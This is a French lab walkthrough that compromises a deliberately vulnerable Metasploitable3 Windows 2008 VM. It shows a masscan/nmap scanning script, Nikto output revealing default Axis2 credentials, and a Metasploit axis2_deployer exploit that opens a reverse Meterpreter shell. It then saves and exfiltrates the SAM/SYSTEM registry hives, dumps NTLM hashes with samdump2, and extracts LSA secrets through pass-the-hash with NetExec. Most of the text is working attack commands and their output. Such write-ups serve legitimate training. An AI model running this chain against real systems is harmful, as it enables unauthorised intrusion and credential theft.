# Metasploitable3-win2k8

<ins>1.Énumération</ins>

J’ai choisi d’écrire un script bash pour accélérer la découverte des 65535 port en scan furtif  avec la combinaison de `masscan` & `nmap`

```
#!/bin/bash

# Reseau interne Virtualbox
gateway='192.168.56.1'
mac='0a:00:27:00:00:00'

mass='res_ports.txt'
port='ports.txt'

read -p 'Entrer une IP: ' IP
read -p 'Entrer un rate: ' rate

# Masscan scan par defaut en mode furtif
masscan $IP -p- --rate $rate  --router-ip $gateway --router-mac $mac -oG $mass

if [ ! -s "$mass" ]; then
    echo "Aucun port ouvert"
    exit 1
else
    grep "open" $mass | awk '{print $7}' | cut -d'/' -f1 > $port
fi

# Scan furtif , et crée un rapport en html
nmap -sS -A -sC -p $(cat $port | tr '\n' ',') --script vuln -v -oX $IP-tcp.xml $IP

xsltproc $IP-tcp.xml > $IP-tcp.html

rm $port $mass
```

&nbsp;

**👁️ Nmap & Masscan**

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $sudo sh massap.sh
Entrer une IP: 192.168.56.110
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-07 13:55:00 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 13:59 GMT           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:59
Completed NSE at 14:00, 10.02s elapsed
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Initiating ARP Ping Scan at 14:00
Scanning 192.168.56.110 [1 port]
Completed ARP Ping Scan at 14:00, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:00
Completed Parallel DNS resolution of 1 host. at 14:00, 0.00s elapsed
Initiating SYN Stealth Scan at 14:00
Scanning 192.168.56.110 [45 ports]
Discovered open port 135/tcp on 192.168.56.110
Discovered open port 139/tcp on 192.168.56.110
Discovered open port 445/tcp on 192.168.56.110
Discovered open port 3306/tcp on 192.168.56.110
Discovered open port 8080/tcp on 192.168.56.110
Discovered open port 3389/tcp on 192.168.56.110
Discovered open port 22/tcp on 192.168.56.110
Discovered open port 8020/tcp on 192.168.56.110
Discovered open port 49152/tcp on 192.168.56.110
Discovered open port 8282/tcp on 192.168.56.110
Discovered open port 8585/tcp on 192.168.56.110
Discovered open port 8022/tcp on 192.168.56.110
Discovered open port 49170/tcp on 192.168.56.110
Discovered open port 49260/tcp on 192.168.56.110
Discovered open port 8031/tcp on 192.168.56.110
Discovered open port 47001/tcp on 192.168.56.110
Discovered open port 8484/tcp on 192.168.56.110
Discovered open port 49257/tcp on 192.168.56.110
Discovered open port 3700/tcp on 192.168.56.110
Discovered open port 8028/tcp on 192.168.56.110
Discovered open port 49154/tcp on 192.168.56.110
Discovered open port 9300/tcp on 192.168.56.110
Discovered open port 49168/tcp on 192.168.56.110
Discovered open port 49155/tcp on 192.168.56.110
Discovered open port 8032/tcp on 192.168.56.110
Discovered open port 49153/tcp on 192.168.56.110
Discovered open port 8027/tcp on 192.168.56.110
Discovered open port 5985/tcp on 192.168.56.110
Discovered open port 8443/tcp on 192.168.56.110
Discovered open port 9200/tcp on 192.168.56.110
Discovered open port 49222/tcp on 192.168.56.110
Discovered open port 7676/tcp on 192.168.56.110
Discovered open port 8181/tcp on 192.168.56.110
Discovered open port 8686/tcp on 192.168.56.110
Discovered open port 8009/tcp on 192.168.56.110
Discovered open port 8019/tcp on 192.168.56.110
Discovered open port 3920/tcp on 192.168.56.110
Discovered open port 49283/tcp on 192.168.56.110
Discovered open port 49221/tcp on 192.168.56.110
Discovered open port 4848/tcp on 192.168.56.110
Discovered open port 1617/tcp on 192.168.56.110
Discovered open port 8383/tcp on 192.168.56.110
Discovered open port 49169/tcp on 192.168.56.110
Discovered open port 8444/tcp on 192.168.56.110
Discovered open port 3820/tcp on 192.168.56.110
Completed SYN Stealth Scan at 14:00, 0.12s elapsed (45 total ports)
Initiating Service scan at 14:00
Scanning 45 services on 192.168.56.110
```

&nbsp;

👽 **Nikto**

Scan a la recherche de utilisateur & mot de passe web

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $nikto -url http://192.168.56.110:8282/ -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.110
+ Target Hostname:    192.168.56.110
+ Target Port:        8282
+ Start Time:         2025-01-07 14:30:29 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
+ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 Happiness Page identified which includes internal application details.
+ /manager/html: Default Tomcat Manager / Host Manager interface found.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /axis2/axis2-admin/: Apache Axis2 administration console found.
+ /axis2/services/Version/getVersion: Apache Axis2 version identified.
+ /axis2/services/listServices: Apache Axis2 WebServices identified.
+ /axis2/axis2-web/index.jsp: Apache Axis2 Web Application identified.
+ /axis2/axis2-admin/login: Apache Axis2 administration console with default credentials admin:axis2 found. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2103
+ /manager/status: Default Tomcat Server Status interface found.
+ 26944 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2025-01-07 14:32:16 (GMT0) (107 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

&nbsp;

<ins>2.Exploitation</ins>

**💥 Metasploit**

Avec le user & password trouver par `nikto`  j'ai pu obtenir un shell

```
[msf](Jobs:0 Agents:0) exploit(multi/http/axis2_deployer) >> set rhosts 192.168.56.45
rhosts => 192.168.56.45
[msf](Jobs:0 Agents:0) exploit(multi/http/axis2_deployer) >> set lhost 192.168.56.104
lhost => 192.168.56.104
[msf](Jobs:0 Agents:0) exploit(multi/http/axis2_deployer) >> set rport 8282
rport => 8282
[msf](Jobs:0 Agents:0) exploit(multi/http/axis2_deployer) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(multi/http/axis2_deployer) >> run

[*] Started reverse TCP handler on 192.168.56.104:4444 
[+] http://192.168.56.45:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
[+] Successfully uploaded
[*] Polling to see if the service is ready
[*] Sending stage (58037 bytes) to 192.168.56.45
[+] Deleted webapps/axis2/WEB-INF/services/qMjnQuTg.jar
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.45:49376) at 2025-01-07 20:26:29 +0100

(Meterpreter 1)(C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33) > 
```

&nbsp;

Impossible de récupérer les hash via `hashdump`

```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33) > hashdump
[-] The "hashdump" command requires the "priv" extension to be loaded (run: `load priv`)
(Meterpreter 1)(C:\) > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (java/windows)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*
```

&nbsp;

J’ai du donc enregistrer le contenu du registre de la base SAM & SYSTEM

```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33) > shell
Process 5 created.
Channel 10 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33>reg save HKLM\SAM C:\sam
reg save HKLM\SAM C:\sam
The operation completed successfully.

C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33>reg save HKLM\SYSTEM C:\system
reg save HKLM\SYSTEM C:\system
The operation completed successfully.


```

&nbsp;

J’ai ensuite télécharger le fichier `SAM` & `SYSTEM` sur ma machine

```
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33) > cd C:\
(Meterpreter 1)(C:\) > download sam
[*] Downloading: sam -> /home/parrot/sam
[*] Downloaded 48.00 KiB of 48.00 KiB (100.0%): sam -> /home/parrot/sam
[*] Completed  : sam -> /home/parrot/sam

(Meterpreter 1)(C:\) > download system
[*] Downloading: system -> /home/parrot/system
[*] Downloaded 1.00 MiB of 7.36 MiB (13.59%): system -> /home/parrot/system
[*] Downloaded 2.00 MiB of 7.36 MiB (27.18%): system -> /home/parrot/system
[*] Downloaded 3.00 MiB of 7.36 MiB (40.76%): system -> /home/parrot/system
[*] Downloaded 4.00 MiB of 7.36 MiB (54.35%): system -> /home/parrot/system
[*] Downloaded 5.00 MiB of 7.36 MiB (67.94%): system -> /home/parrot/system
[*] Downloaded 6.00 MiB of 7.36 MiB (81.53%): system -> /home/parrot/system
[*] Downloaded 7.00 MiB of 7.36 MiB (95.12%): system -> /home/parrot/system
[*] Downloaded 7.36 MiB of 7.36 MiB (100.0%): system -> /home/parrot/system
[*] Completed  : system -> /home/parrot/system
```

&nbsp;

**🧨 Sam2dump**

Avec le fichier `SAM` & `SYSTEM`  en utilisant Sam2Dump on a pu récupérer les hash utilisateur

```
┌─[parrot@parrot]─[~]
└──╼ $samdump2 system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
*disabled* sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
```

&nbsp;

&nbsp;<span style="color: #dddddd;">🖥️</span> **NetExec**

Dump des secret LSA

```
┌─[parrot@parrot]─[~]
└──╼ $nxc smb 192.168.56.45 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b --lsa
SMB         192.168.56.45   445    VAGRANT-2008R2   [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:VAGRANT-2008R2) (domain:vagrant-2008R2) (signing:False) (SMBv1:True)
SMB         192.168.56.45   445    VAGRANT-2008R2   [+] vagrant-2008R2\Administrator:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.56.45   445    VAGRANT-2008R2   [+] Dumping LSA secrets
SMB         192.168.56.45   445    VAGRANT-2008R2   vagrant:vagrant
SMB         192.168.56.45   445    VAGRANT-2008R2   dpapi_machinekey:0x2548d5be7607e758eb76c06285e82df33ebd456b
dpapi_userkey:0xdf1bbc0de4d5eed30572632bde9e561a7eb50d5e
SMB         192.168.56.45   445    VAGRANT-2008R2   sshd_server:D@rj33l1ng
SMB         192.168.56.45   445    VAGRANT-2008R2   [+] Dumped 3 LSA secrets to /home/parrot/.nxc/logs/VAGRANT-2008R2_192.168.56.45_2025-01-08_203606.secrets and /home/parrot/.nxc/logs/VAGRANT-2008R2_192.168.56.45_2025-01-08_203606.cached
```

&nbsp;
